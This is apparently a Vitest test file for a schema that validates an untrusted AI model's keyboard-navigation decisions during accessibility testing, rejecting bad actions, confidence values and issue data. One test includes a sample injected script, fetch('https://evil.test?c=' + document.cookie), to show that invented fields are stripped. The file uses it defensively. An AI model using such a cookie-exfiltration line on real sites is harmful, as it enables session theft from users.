import { describe, expect, it } from "vitest";

import {
  actionFor,
  issueFor,
  parseAgentDecision,
  safeParseAgentDecision,
  type AgentDecision,
} from "@/lib/shared/domain";

/**
 * The structured output contract.
 *
 * `AgentDecision` is the only channel from an untrusted model into the system,
 * so these tests are mostly about what the schema makes *impossible*. Every
 * malformed response rejected here is a keypress the browser never makes.
 */

const CONTINUE = {
  decision: "CONTINUE",
  action: "TAB",
  reason: "Continue exploring sequential keyboard navigation.",
  confidence: 0.94,
};

const INVESTIGATE = {
  decision: "INVESTIGATE",
  action: "SHIFT_TAB",
  reason:
    "Focus appears to have skipped a visible interactive control. Investigate the previous focus path.",
  confidence: 0.91,
  suspectedIssue: { type: "SUSPICIOUS_FOCUS_ORDER", severity: "HIGH" },
};

const REPORT = {
  decision: "REPORT",
  reason: "Tab traversal completed twice without ever focusing this control.",
  confidence: 0.96,
  issue: {
    type: "UNREACHABLE_ELEMENT",
    severity: "HIGH",
    title: "Delete account button cannot be reached by keyboard",
    description:
      "The control is a div with role=button and no tabindex, so Tab never lands on it.",
  },
};

const STOP = {
  decision: "STOP",
  reason: "Every discovered control has been reached.",
  confidence: 0.99,
};

describe("valid decisions", () => {
  it("accepts CONTINUE with an action", () => {
    const decision = parseAgentDecision(CONTINUE);

    expect(decision.decision).toBe("CONTINUE");
    expect(actionFor(decision)).toBe("TAB");
    expect(decision.confidence).toBe(0.94);
  });

  it("accepts INVESTIGATE with a suspected issue", () => {
    const decision = parseAgentDecision(INVESTIGATE);

    if (decision.decision !== "INVESTIGATE") {
      return expect.unreachable("expected INVESTIGATE");
    }
    expect(actionFor(decision)).toBe("SHIFT_TAB");
    expect(decision.suspectedIssue).toEqual({
      type: "SUSPICIOUS_FOCUS_ORDER",
      severity: "HIGH",
    });
  });

  it("accepts REPORT with a full issue", () => {
    const decision = parseAgentDecision(REPORT);

    if (decision.decision !== "REPORT") return expect.unreachable("expected REPORT");
    expect(decision.issue.type).toBe("UNREACHABLE_ELEMENT");
    expect(decision.issue.title).toContain("Delete account");
    expect(decision.issue.description).not.toBe("");
  });

  it("accepts STOP with nothing but a reason", () => {
    const decision = parseAgentDecision(STOP);

    expect(decision.decision).toBe("STOP");
    expect(actionFor(decision)).toBeNull();
  });

  it("accepts both allowlisted actions", () => {
    expect(actionFor(parseAgentDecision({ ...CONTINUE, action: "TAB" }))).toBe("TAB");
    expect(actionFor(parseAgentDecision({ ...CONTINUE, action: "SHIFT_TAB" }))).toBe(
      "SHIFT_TAB",
    );
  });

  it("accepts an optional target element", () => {
    const decision = parseAgentDecision({
      ...CONTINUE,
      targetElementId: "html > button",
    });

    if (decision.decision !== "CONTINUE") return expect.unreachable("expected CONTINUE");
    expect(decision.targetElementId).toBe("html > button");
  });

  it("narrows on the discriminant", () => {
    const decision: AgentDecision = parseAgentDecision(REPORT);

    // `issue` is reachable only because the union narrowed. On any other member
    // the property does not exist at all.
    if (decision.decision === "REPORT") {
      expect(issueFor(decision)).toBe(decision.issue);
    } else {
      expect.unreachable("expected REPORT");
    }
  });

  it("reports the issue a decision names, whatever kind it is", () => {
    expect(issueFor(parseAgentDecision(INVESTIGATE))).toMatchObject({
      type: "SUSPICIOUS_FOCUS_ORDER",
    });
    expect(issueFor(parseAgentDecision(REPORT))).toMatchObject({
      type: "UNREACHABLE_ELEMENT",
    });
    expect(issueFor(parseAgentDecision(CONTINUE))).toBeNull();
    expect(issueFor(parseAgentDecision(STOP))).toBeNull();
  });
});

describe("invalid actions", () => {
  // Every out-of-scope key is excluded for what it does on an untrusted page —
  // Enter and Space activate controls, Escape dismisses dialogs.
  it.each(["ENTER", "SPACE", "ESCAPE", "ARROW_DOWN", "ARROW_UP", "HOME", "END", "F5"])(
    "rejects %s",
    (action) => {
      expect(safeParseAgentDecision({ ...CONTINUE, action }).success).toBe(false);
    },
  );

  // A raw Playwright key string is the mistake the domain enum exists to catch.
  it.each(["Tab", "Shift+Tab", "tab", "TAB ", " TAB", "TAB\n"])(
    "rejects the near-miss %s",
    (action) => {
      expect(safeParseAgentDecision({ ...CONTINUE, action }).success).toBe(false);
    },
  );

  it.each([null, 42, {}, ["TAB"], true])("rejects the non-action %s", (action) => {
    expect(safeParseAgentDecision({ ...CONTINUE, action }).success).toBe(false);
  });

  it("rejects CONTINUE with no action — it is a decision that must move", () => {
    const { action: _omitted, ...withoutAction } = CONTINUE;

    expect(safeParseAgentDecision(withoutAction).success).toBe(false);
  });

  it("rejects INVESTIGATE with no action", () => {
    const { action: _omitted, ...withoutAction } = INVESTIGATE;

    expect(safeParseAgentDecision(withoutAction).success).toBe(false);
  });

  // Reporting records a finding; it does not move. An action riding along would
  // be a keypress nobody asked for.
  it("drops an action attached to REPORT", () => {
    const decision = parseAgentDecision({ ...REPORT, action: "TAB" });

    expect(decision).not.toHaveProperty("action");
    expect(actionFor(decision)).toBeNull();
  });

  it("drops an action attached to STOP", () => {
    const decision = parseAgentDecision({ ...STOP, action: "TAB" });

    expect(decision).not.toHaveProperty("action");
    expect(actionFor(decision)).toBeNull();
  });
});

describe("invalid confidence", () => {
  it.each([-0.1, 1.1, 2, -1, Number.NaN, Number.POSITIVE_INFINITY])(
    "rejects %s",
    (value) => {
      expect(safeParseAgentDecision({ ...CONTINUE, confidence: value }).success).toBe(
        false,
      );
    },
  );

  it.each(["0.9", "high", null, {}])("rejects the non-number %s", (value) => {
    expect(safeParseAgentDecision({ ...CONTINUE, confidence: value }).success).toBe(
      false,
    );
  });

  it("accepts the boundaries", () => {
    expect(safeParseAgentDecision({ ...CONTINUE, confidence: 0 }).success).toBe(true);
    expect(safeParseAgentDecision({ ...CONTINUE, confidence: 1 }).success).toBe(true);
  });

  it("rejects a missing confidence", () => {
    const { confidence: _omitted, ...withoutConfidence } = CONTINUE;

    expect(safeParseAgentDecision(withoutConfidence).success).toBe(false);
  });
});

describe("malformed issue data", () => {
  it("rejects an unknown issue type", () => {
    expect(
      safeParseAgentDecision({
        ...REPORT,
        issue: { ...REPORT.issue, type: "COLOR_CONTRAST" },
      }).success,
    ).toBe(false);
  });

  it("rejects an unknown severity", () => {
    expect(
      safeParseAgentDecision({
        ...REPORT,
        issue: { ...REPORT.issue, severity: "CATASTROPHIC" },
      }).success,
    ).toBe(false);
  });

  it.each(["type", "severity", "title", "description"])(
    "rejects a REPORT issue missing %s",
    (field) => {
      const issue: Record<string, unknown> = { ...REPORT.issue };
      delete issue[field];

      expect(safeParseAgentDecision({ ...REPORT, issue }).success).toBe(false);
    },
  );

  // A title or description nobody can act on is not a bug report.
  it("rejects an empty title or description", () => {
    expect(
      safeParseAgentDecision({ ...REPORT, issue: { ...REPORT.issue, title: "" } })
        .success,
    ).toBe(false);
    expect(
      safeParseAgentDecision({ ...REPORT, issue: { ...REPORT.issue, description: "" } })
        .success,
    ).toBe(false);
  });

  it("rejects an issue that is not an object", () => {
    for (const issue of ["UNREACHABLE_ELEMENT", null, 42, ["x"]]) {
      expect(safeParseAgentDecision({ ...REPORT, issue }).success).toBe(false);
    }
  });

  it.each(["type", "severity"])("rejects a suspected issue missing %s", (field) => {
    const suspectedIssue: Record<string, unknown> = { ...INVESTIGATE.suspectedIssue };
    delete suspectedIssue[field];

    expect(safeParseAgentDecision({ ...INVESTIGATE, suspectedIssue }).success).toBe(
      false,
    );
  });

  // A suspicion has not earned a bug report yet; extra prose is dropped rather
  // than promoted into a finding.
  it("drops title and description from a suspected issue", () => {
    const decision = parseAgentDecision({
      ...INVESTIGATE,
      suspectedIssue: {
        ...INVESTIGATE.suspectedIssue,
        title: "premature",
        description: "premature",
      },
    });

    if (decision.decision !== "INVESTIGATE") {
      return expect.unreachable("expected INVESTIGATE");
    }
    expect(decision.suspectedIssue).toEqual({
      type: "SUSPICIOUS_FOCUS_ORDER",
      severity: "HIGH",
    });
  });

  it("drops an issue attached to CONTINUE", () => {
    const decision = parseAgentDecision({ ...CONTINUE, issue: REPORT.issue });

    expect(decision).not.toHaveProperty("issue");
  });

  it("drops a suspected issue attached to STOP", () => {
    const decision = parseAgentDecision({
      ...STOP,
      suspectedIssue: INVESTIGATE.suspectedIssue,
    });

    expect(decision).not.toHaveProperty("suspectedIssue");
  });
});

describe("missing required fields", () => {
  it("rejects INVESTIGATE with no suspected issue", () => {
    const { suspectedIssue: _omitted, ...withoutIssue } = INVESTIGATE;

    expect(safeParseAgentDecision(withoutIssue).success).toBe(false);
  });

  it("rejects REPORT with no issue", () => {
    const { issue: _omitted, ...withoutIssue } = REPORT;

    expect(safeParseAgentDecision(withoutIssue).success).toBe(false);
  });

  it.each([CONTINUE, INVESTIGATE, REPORT, STOP])(
    "rejects a decision with no reason",
    (source) => {
      const { reason: _omitted, ...withoutReason } = source;

      expect(safeParseAgentDecision(withoutReason).success).toBe(false);
    },
  );

  it("rejects an empty reason", () => {
    expect(safeParseAgentDecision({ ...CONTINUE, reason: "" }).success).toBe(false);
  });

  it("rejects a missing or unknown decision", () => {
    const { decision: _omitted, ...withoutDecision } = CONTINUE;

    expect(safeParseAgentDecision(withoutDecision).success).toBe(false);
    expect(safeParseAgentDecision({ ...CONTINUE, decision: "CLICK" }).success).toBe(
      false,
    );
    expect(safeParseAgentDecision({ ...CONTINUE, decision: "" }).success).toBe(false);
  });
});

describe("malformed responses", () => {
  it("throws rather than returning a default action", () => {
    // The failure mode this prevents: a schema that repaired bad input would
    // press a key the model never actually asked for.
    expect(() => parseAgentDecision({})).toThrow();
    expect(() => parseAgentDecision(null)).toThrow();
    expect(() => parseAgentDecision("TAB")).toThrow();
    expect(() => parseAgentDecision([CONTINUE])).toThrow();
    expect(() => parseAgentDecision(42)).toThrow();
  });

  // The model has no channel for a selector, a URL, or a script: fields it
  // invents do not survive parsing, so nothing downstream can act on them.
  it("strips fields the model invents", () => {
    const parsed = parseAgentDecision({
      ...CONTINUE,
      selector: "#admin",
      script: "fetch('https://evil.test?c=' + document.cookie)",
      url: "https://evil.test",
      key: "Enter",
    });

    expect(Object.keys(parsed).sort()).toEqual([
      "action",
      "confidence",
      "decision",
      "reason",
    ]);
  });

  it("reports every problem, not just the first", () => {
    const result = safeParseAgentDecision({
      decision: "INVESTIGATE",
      action: "ENTER",
      reason: "",
      confidence: 5,
      suspectedIssue: { type: "NOPE", severity: "NOPE" },
    });

    expect(result.success).toBe(false);
    if (!result.success) expect(result.error.issues.length).toBeGreaterThan(1);
  });
});
